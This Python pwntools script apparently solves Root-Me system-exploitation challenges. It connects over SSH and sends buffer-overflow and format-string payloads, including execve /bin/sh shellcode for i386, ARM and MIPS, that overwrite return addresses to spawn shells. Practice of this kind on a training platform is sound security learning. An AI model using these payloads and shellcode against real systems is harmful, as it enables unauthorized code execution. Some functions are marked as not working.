from pwn import context, ssh, ELF, packing, cyclic, cyclic_find, log, gdb
from sys import argv
from os import path, remove
from subprocess import check_output


def get_offset(s):
    pattern = raw_input("Give me the value : ")
    return cyclic_find(packing.pack(int(pattern.strip(), s)))


def run_gdb(s, f, c):
    gdb.attach(s.process(f), c, ssh=True)


def get_shelladdr(f, s, a):
    if not path.isfile(f):
        s.download(f)
    res = ELF(f).symbols[a]
    remove(f)
    log.info("shellcode_addr: %#x" % res)
    return res


def get_retaddr(f):
    return check_output("/usr/bin/objdump -d %s | /usr/bin/awk '$2 ~  \"<main>\" {go=\"true\"} go == \"true\" && $3 == \"retq\" {print $1;exit 0}' | /bin/sed 's/://g'" % f, shell=True)


def run_overflow(c, p, f):
    r = c.process(f)
    r.send(p)
    r.interactive()


def ch12():
    '''Not working.'''
    bin_file = "ch12"
    conn = ssh('app-systeme-ch13',
               'challenge02.root-me.org',
               password='app-systeme-ch13',
               port=2222)
    context.clear()
    context.update(os='linux', arch='i386', log_level='debug')
    s = conn.shell()
    s.send("./" + bin_file + " & sleep 2 & cat /tmp/tmp_file.txt")
    s.close()
    conn.close()


def ch13():
    '''Working.'''
    bin_file = 'ch13'
    conn = ssh('app-systeme-ch13',
               'challenge02.root-me.org',
               password='app-systeme-ch13',
               port=2222)
    context.clear()
    context.update(os='linux', arch='i386')
    offset = 40
    # offset = get_offset(32)
    shellcode_addr = 0xdeadbeef
    payload = b'A' * offset
    payload += packing.p32(shellcode_addr)
    run_overflow(conn, payload, bin_file)


def ch15():
    '''Working.'''
    bin_file = 'ch15'
    conn = ssh('app-systeme-ch15',
               'challenge02.root-me.org',
               password='app-systeme-ch15',
               port=2222)
    context.clear()
    context.update(os='linux', arch='i386')
    offset = 128
    # offset = get_offset(32)
    log.info("Offset: " + str(offset))
    # shellcode_addr = 0x08048516
    shellcode_addr = get_shelladdr(bin_file, conn, 'shell')
    payload = b'A' * offset
    payload += packing.p32(shellcode_addr)
    run_overflow(conn, payload, bin_file)


def ch17():
    conn = ssh('app-systeme-ch17',
               'challenge02.root-me.org',
               password='app-systeme-ch17',
               port=2222)
    context.clear()
    context.update(os='linux', arch='i386')
    shellcode = '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x00'
    shellcode = 'export SHELLCODE=`python -c "print \'' + shellcode + '\'"`; exit'
    log.info("Full shellcode: %s" % shellcode)
    resp = conn.run_to_end(shellcode)
    print(str(resp[0]))
    shellcode_addr = conn.getenv('SHELLCODE')
    log.info("Shellcode_addr: %#x" % shellcode_addr)
    payload = b'%117x'
    payload += shellcode_addr
    log.info("Complete exploit: %s" % payload)
    r = conn.process("./ch17")
    r.send(payload)
    r.interactive()


def ch35():
    '''Working fine.'''
    bin_file = "ch35"
    conn = ssh('app-systeme-ch35',
               'challenge03.root-me.org',
               password='app-systeme-ch35',
               port=2223)
    context.clear()
    context.update(arch='amd64')
    # payload = b'''
    # file ''' + bin_file.encode() + b'''
    # start < ''' + cyclic(300) + b'''
    # break *0x ''' + get_retaddr(bin_file) + b'''
    # continue
    # x/2xg $rsp
    # '''
    # run_gdb(conn, bin_file, payload.decode())
    offset = 280
    # offset = get_offset(64)
    # shellcode_addr = 0x00000000004006cd
    shellcode_addr = get_shelladdr(bin_file, conn, "callMeMaybe")
    log.info("shellcode_addr: %#x" % shellcode_addr)
    payload = b'A' * offset
    payload += packing.p64(shellcode_addr)
    run_overflow(conn, payload, bin_file)


def ch45():
    '''Not working.'''
    bin_file = "ch45"
    conn = ssh('app-systeme-ch45',
               'challenge04.root-me.org',
               password='app-systeme-ch45',
               port=2224)
    context.clear()
    context.update(arch='arm')
    # http://shell-storm.org/shellcode/files/shellcode-696.php
    shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'
    r = conn.process(bin_file)
    r.recvuntil(':')
    r.sendline('AAAA')
    shellcode_addr = r.recvuntil('):')
    log.info("Received: " + shellcode_addr.decode())
    shellcode_addr = shellcode_addr.decode().split(':')[0].strip('\n')
    shellcode_addr = int(shellcode_addr.replace('0x', ''), 16)
    offset = 164
    # offset = get_offset(32)
    payload = shellcode
    payload += b'A' * (offset - len(shellcode))
    payload += packing.p32(shellcode_addr)
    log.info("Shellcode + " + str(offset - len(shellcode)) + " * 'A' + %#x" % shellcode_addr)
    r.sendline('y\n')
    data = r.recvuntil(':')
    log.info("Received: " + data.decode())
    r.sendline(payload + b'\n')
    data = r.recvuntil('):')
    log.info("Received: " + data.decode())
    # r.sendline('n\n')
    r.interactive()


def ch65():
    conn = ssh('app-systeme-ch65',
               'challenge03.root-me.org',
               password='app-systeme-ch65',
               port=2223)
    context.clear()
    context.update(arch='mips', endian='big')
    # http://shell-storm.org/shellcode/files/shellcode-782.php
    shellcode = b'\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00'
    r = conn.process(["qemu-mips", "./ch65"])
    shellcode_addr = 0x76fff6a8+0x14+4
    log.info("shellcode_addr: %#x" % shellcode_addr)
    payload = b'A'*0x14
    payload += packing.p32(shellcode_addr)
    payload += shellcode
    r.send(payload)
    r.interactive()


def ch72():
    '''Working fine..
    To Do: parse pe header to get the admin_shell address'''
    # bin_file = "ch72.exe"
    conn = ssh('app-systeme-ch72',
               'challenge05.root-me.org',
               password='app-systeme-ch72',
               port=2225)
    context.clear()
    offset = 24
    # offset = get_offset(32)
    shellcode_addr = 0x00401003
    # shellcode_addr = get_shelladdr(bin_file, conn, "admin_shell")
    payload = b'A' * offset
    payload += packing.p32(shellcode_addr)
    run_overflow(conn, payload, "wrapper.sh")


def main():
    if len(argv) != 2:
        print("Provide the chall number")
        exit()
    if argv[1] == "12":
        ch12()
    elif argv[1] == "13":
        ch13()
    elif argv[1] == "15":
        ch15()
    elif argv[1] == "17":
        ch17()
    elif argv[1] == "35":
        ch35()
    elif argv[1] == "45":
        ch45()
    elif argv[1] == "65":
        ch65()
    elif argv[1] == "72":
        ch72()


if __name__ == "__main__":
    main()
